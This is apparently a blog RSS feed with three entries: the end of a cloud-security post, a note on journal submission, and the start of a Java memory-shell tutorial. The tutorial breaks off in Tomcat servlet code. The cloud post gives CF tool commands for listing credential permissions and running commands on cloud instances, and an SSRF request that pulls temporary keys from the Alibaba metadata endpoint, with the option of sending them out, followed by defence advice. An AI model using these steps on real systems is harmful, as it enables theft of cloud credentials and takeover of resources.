的用户，如果想改成其他用户名可以使用 -u 参数</span><br><span class="line">cf alibaba console -u lalala</span><br><span class="line">使用以下命令列出当前凭证权限以及可以执行的操作</span><br><span class="line">cf alibaba perm  // 一键列出阿里云的凭证权限</span><br><span class="line">cf tencent perm  // 一键列出腾讯云的凭证权限</span><br><span class="line">cf huawei perm  // 一键列出华为云的凭证权限</span><br><span class="line">cf alibaba oss <span class="built_in">ls</span>  列出OSS资源</span><br><span class="line">cf alibaba ecss <span class="built_in">ls</span>  列出ECS资源</span><br><span class="line">cf alibaba ecs <span class="built_in">exec</span>    在ECS上执行命令</span><br><span class="line">cf alibaba rds <span class="built_in">ls</span>    列出RDS资源</span><br><span class="line">cf alibaba oss obj get     下载存储桶里的对象</span><br><span class="line">cf alibaba oss obj get -b bucketName  指定存储桶</span><br><span class="line">cf alibaba oss obj get -b bucketName -k objectName 指定存储桶以及对象</span><br><span class="line">cf alibaba oss obj get -o ./result   保存到指定目录</span><br><span class="line">具体cf使用命令可以参考：https://wiki.teamssix.com/cf/</span><br></pre></td></tr></table></figure><h4 id="场景-2：通过-SSRF-漏洞获取临时-AK"><a href="#场景-2：通过-SSRF-漏洞获取临时-AK" class="headerlink" title="场景 2：通过 SSRF 漏洞获取临时 AK"></a>场景 2：通过 SSRF 漏洞获取临时 AK</h4><ul><li><p>前提：Web 应用存在 SSRF 漏洞（如允许用户输入 URL 并由服务器发起请求）；</p></li><li><p>利用步骤：</p></li></ul><ol><li>构造 SSRF 请求，访问元数据的临时凭证路径（以阿里云为例）：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 假设Web应用的SSRF接口为http://target.com/ssrf?url=xxx</span><br><span class="line">构造请求：http://target.com/ssrf?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/ecs-admin</span><br></pre></td></tr></table></figure><ol><li><p>若 SSRF 漏洞可回显结果，攻击者可直接获取临时 AccessKey；</p></li><li><p>若不可回显，可将临时 AK 发送至攻击者控制的服务器（如通过 DNSlog 或 HTTP 请求外带）；</p></li></ol><h2 id="防御建议："><a href="#防御建议：" class="headerlink" title="防御建议："></a>防御建议：</h2><p>限制 ECS 实例元数据的访问范围（部分云厂商支持，如 AWS 可通过 IAM 策略禁止特定角色访问元数据）；</p><p>修复 Web 应用的 SSRF 漏洞，禁止请求内网地址（如<code>100.100.100.0/24</code>、<code>169.254.0.0/16</code>）；</p><p>为 IAM 角色配置最小权限，避免临时 AK 泄露后导致大规模资源被控制。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;云服务基础介绍&quot;&gt;&lt;a href=&quot;#云服务基础介绍&quot; class=&quot;headerlink&quot; title=&quot;云服务基础介绍&quot;&gt;&lt;/a&gt;云服务基础介绍&lt;/h1&gt;&lt;p&gt;云服务，顾名思义就是云上服务，在云厂商上购买的产品服务。国内有阿里云、腾讯云、华为云、天翼云、Ucl</summary>
      
    
    
    
    <category term="云安全" scheme="https://250wuyifan.github.io/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="云安全" scheme="https://250wuyifan.github.io/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>论文期刊投稿流程学习笔记</title>
    <link href="https://250wuyifan.github.io/2025/09/09/%E8%AE%BA%E6%96%87%E6%9C%9F%E5%88%8A%E6%8A%95%E7%A8%BF%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://250wuyifan.github.io/2025/09/09/%E8%AE%BA%E6%96%87%E6%9C%9F%E5%88%8A%E6%8A%95%E7%A8%BF%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2025-09-09T07:14:18.000Z</published>
    <updated>2025-09-09T09:44:17.207Z</updated>
    
    <content type="html"><![CDATA[<p>首先就是要写论文了，没搞过，记录一下，首先就是之前大量看过别人的文章，我的主题就是《恶意代码检测》，因为我们工位电脑有大量恶意文件，供我们训练使用。</p><h1 id="确认期刊"><a href="#确认期刊" class="headerlink" title="确认期刊"></a>确认期刊</h1><p>这块内容主要是根据我自己的想法来的。</p><p>如下图，我看到了这篇跟我内容关联的</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909153946239.png" alt="image-20250909153946239"></p><p>左上角显示有这个期刊名称，点击进入</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909154130470.png" alt="image-20250909154130470"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909164927458.png" alt="image-20250909164927458"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909154200841.png" alt="image-20250909154200841"></p><h1 id="期刊官网"><a href="#期刊官网" class="headerlink" title="期刊官网"></a>期刊官网</h1><p>直接百度搜索进入官网。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909165153881.png" alt="image-20250909165153881"></p><h1 id="投稿指南"><a href="#投稿指南" class="headerlink" title="投稿指南"></a>投稿指南</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909165337985.png" alt="image-20250909165337985"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909165427254.png" alt="image-20250909165427254"></p><h1 id="论文模版"><a href="#论文模版" class="headerlink" title="论文模版"></a>论文模版</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909172954200.png" alt="image-20250909172954200"></p><p>下载下来是PDF，转成word。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909173219011.png" alt="image-20250909173219011"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先就是要写论文了，没搞过，记录一下，首先就是之前大量看过别人的文章，我的主题就是《恶意代码检测》，因为我们工位电脑有大量恶意文件，供我们训练使用。&lt;/p&gt;
&lt;h1 id=&quot;确认期刊&quot;&gt;&lt;a href=&quot;#确认期刊&quot; class=&quot;headerlink&quot; title=&quot;确认</summary>
      
    
    
    
    <category term="研究生生活" scheme="https://250wuyifan.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="研究生生活" scheme="https://250wuyifan.github.io/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>从零掌握java内存马</title>
    <link href="https://250wuyifan.github.io/2025/09/06/%E4%BB%8E%E9%9B%B6%E6%8E%8C%E6%8F%A1java%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://250wuyifan.github.io/2025/09/06/%E4%BB%8E%E9%9B%B6%E6%8E%8C%E6%8F%A1java%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2025-09-06T15:25:51.000Z</published>
    <updated>2025-09-09T17:53:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Tomcat-容器"><a href="#Tomcat-容器" class="headerlink" title="Tomcat 容器"></a>Tomcat 容器</h2><p>Tomcat 设计了四种容器，分别是Engine、Host、Context和Wrapper，其关系如下：<br>1.连接器负责外部交流，容器负责内部处理。具体来说就是，连接器处理 Socket 通信和应用层协议的解析，得到 Servlet请求；<br>2.而容器则负责处理 Servlet请求。容器：顾名思义就是拿来装东西的， 所以 Tomcat 容器就是拿来装载 Servlet。</p><p>Tomcat 设计了 4 种容器，分别是 Engine、Host、Context和 Wrapper。Server 代表 Tomcat 实例。<br>★★★<code>Wrapper 表示一个 Servlet ，Context 表示一个 Web 应用程序，而一个 Web 程序可能有多个 Servlet ；Host 表示一个虚拟主机，或者说一个站点，一个 Tomcat 可以配置多个站点（Host）；一个站点（ Host） 可以部署多个 Web 应用；Engine 代表 引擎，用于管理多个站点（Host），一个 Service 只能有 一个 Engine。</code></p><p>&#96;清晰解析：<br>Tomcat由四大容器组成，分别是Engine、Host、Context、Wrapper。这四个组件是负责关系，存在包含关系。只包含一个引擎（Engine）：<br>Engine（引擎）：表示可运行的Catalina的servlet引擎实例，并且包含了servlet容器的核心功能。在一个服务中只能有一个引擎。同时，作为一个真正的容器，Engine元素之下可以包含一个或多个虚拟主机。它主要功能是将传入请求委托给适当的虚拟主机处理。如果根据名称没有找到可处理的虚拟主机，那么将根据默认的Host来判断该由哪个虚拟主机处理。<br>Host （虚拟主机）：作用就是运行多个应用，它负责安装和展开这些应用，并且标识这个应用以便能够区分它们。它的子容器通常是 Context。一个虚拟主机下都可以部署一个或者多个Web App，每个Web App对应于一个Context，当Host获得一个请求时，将把该请求匹配到某个Context上，然后把该请求交给该Context来处理。主机组件类似于Apache中的虚拟主机，但在Tomcat中只支持基于FQDN(完全合格的主机名)的“虚拟主机”。Host主要用来解析web.xml<br>Context（上下文）：代表 Servlet 的 Context，它具备了 Servlet 运行的基本环境，它表示Web应用程序本身。Context 最重要的功能就是管理它里面的 Servlet 实例，一个Context代表一个Web应用，一个Web应用由一个或者多个Servlet实例组成。<br>Wrapper（包装器）：代表一个 Servlet，它负责管理一个 Servlet，包括的 Servlet 的装载、初始化、执行以及资源回收。Wrapper 是最底层的容器，它没有子容器了，所以调用它的 addChild 将会报错。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250624155841-0b31c6ca-50d1-1.png" alt="img"></p><p>我们此时要访问<a href="https://manage.xxx.com:8080/user/list">https://manage.xxx.com:8080/user/list</a> ，tomcat 为了实现请求定位到具体的 servlet ，为此 tomcat 设计了 Mapper ，其中保存了容器组件与访问路径的映射关系。</p><p>★假如有用户访问一个 URL，比如图中的<a href="http://user.shopping.com:8080/order/buy%EF%BC%8CTomcat">http://user.shopping.com:8080/order/buy，Tomcat</a> 如何将这个 URL 定位到一个 Servlet 呢？</p><p><strong>1.首先根据协议和端口号确定连接器。</strong> </p><p>Tomcat 默认的 HTTP 连接器监听 8080 端口、默认的 AJP 连接器监听 8009 端口。上面例子中的 URL 访问的是 8080 端口，因此这个请求会被 HTTP 连接器接收，而一个连接器是属于一个 Service 组件的，这样 Service 组件就确定了。我们还知道一个 Service 组件里除了有多个连接器，还有一个容器组件，具体来说就是一个 Engine 容器，因此 Service 确定了也就意味着 Engine 也确定了。</p><p><strong>2.根据域名选定 Host（站点）</strong> </p><p>Service 和 Engine 确定后，Mapper 组件通过 URL 中的域名去查找相应的 Host 容器，比如例子中的 URL 访问的域名是user.shopping.com，因此 Mapper 会找到 Host2 这个容器。</p><p><strong>3.根据 URL 路径找到 Context 组件（Web应用）</strong></p><p>Host 确定以后，Mapper 根据 URL 的路径来匹配相应的 Web 应用的路径，比如例子中访问的是 &#x2F;order，因此找到了 Context4 这个 Context 容器。 </p><p><strong>4.根据 URL 路径找到 Wrapper（Servlet）</strong></p><p>Context 确定后，Mapper 再根据 web.xml 中配置的 Servlet 映射路径来找到具体的 Wrapper 和 Servlet。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250624155843-0c40a928-50d1-1.png" alt="img"></p><h2 id="servlet组件（小型应用）"><a href="#servlet组件（小型应用）" class="headerlink" title="servlet组件（小型应用）"></a>servlet组件（小型应用）</h2><h3 id="编写一个简单的-servlet"><a href="#编写一个简单的-servlet" class="headerlink" title="编写一个简单的 servlet"></a>编写一个简单的 servlet</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servletLearn<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>servletLearn Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>servletLearn<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907000325127.png" alt="image-20250907000325127"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907000400402.png" alt="image-20250907000400402"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907000335325.png" alt="image-20250907000335325"></p><h2 id="代码层面看servlet初始化与装载流程"><a href="#代码层面看servlet初始化与装载流程" class="headerlink" title="代码层面看servlet初始化与装载流程"></a>代码层面看servlet初始化与装载流程</h2><p>主要参考文章：</p><blockquote><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/">https://longlone.top/安全/java/java安全/内存马/Tomcat-Servlet型/</a></p></blockquote><p>我们这里不采用我们下载的<code>tomcat</code>来运行我们的项目，我们使用嵌入式<code>tomcat</code>也就是所谓的<code>tomcat-embed-core</code>。关于动态调试，我是图省事，直接用<code>tomcat-embed-core</code>，你当然也可以调试直接调试<code>tomcat</code>源码，环境搭建方法可以参考<code>Skay</code>师傅的文章：</p><blockquote><p><a href="https://mp.weixin.qq.com/s/DMVcqtiNG9gMdrBUyCRCgw">https://mp.weixin.qq.com/s/DMVcqtiNG9gMdrBUyCRCgw</a></p></blockquote><p>我们重开一个项目，文件代码如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servletLearn1<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>servletLearn1 Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>servletLearn1<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleException;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.startup.Tomcat;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> LifecycleException &#123;</span><br><span class="line">        <span class="type">Tomcat</span> <span class="variable">tomcat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat</span>();</span><br><span class="line">        tomcat.getConnector(); <span class="comment">//tomcat 9.0以上需要加这行代码，参考：https://blog.csdn.net/qq_42944840/article/details/116349603</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> tomcat.addWebapp(<span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;.&quot;</span>).getAbsolutePath());</span><br><span class="line">        Tomcat.addServlet(context, <span class="string">&quot;helloServlet&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloServlet</span>());</span><br><span class="line">        context.addServletMappingDecoded(<span class="string">&quot;/hello&quot;</span>, <span class="string">&quot;helloServlet&quot;</span>);</span><br><span class="line">        tomcat.start();</span><br><span class="line">        tomcat.getServer().await();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907002049554.png" alt="image-20250907002049554"></p><h3 id="servlet初始化流程分析"><a href="#servlet初始化流程分析" class="headerlink" title="servlet初始化流程分析"></a>servlet初始化流程分析</h3><p>我们在<code>org.apache.catalina.core.StandardWrapper#setServletClass</code>处下断点调试：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907002420597.png" alt="image-20250907002420597">然后就可以看到，上层调用位置位于<code>org.apache.catalina.startup.ContextConfig#configureContext</code>：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907003102608.png" alt="image-20250907003102608"></p><p>接下来我们详细看下面这段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 